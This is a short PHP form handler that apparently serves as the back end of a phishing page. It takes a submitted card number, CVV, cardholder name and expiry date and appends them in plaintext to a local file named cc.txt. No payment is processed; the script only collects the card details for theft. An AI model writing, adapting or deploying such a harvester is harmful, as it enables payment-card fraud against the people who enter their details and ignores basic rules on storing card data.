

<?php
// define variables and set to empty values
$ccno = $cvv = $nm = $exp = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $ccno = test_input($_POST["ccno"]);
  $cvv = test_input($_POST["cvv"]);
  $nm = test_input($_POST["nm"]);
  $exp = test_input($_POST["exp"]);
  $myfile = fopen("cc.txt", "a") or die("Unable to open file!");
  $txt = $ccno."<>".$cvv."<>".$nm."<>".$exp."\n";
  fwrite($myfile, $txt);
  fclose($myfile);
}

function test_input($data) {
  $data = trim($data);
  $data = stripslashes($data);
  $data = htmlspecialchars($data);
  return $data;
}
?>






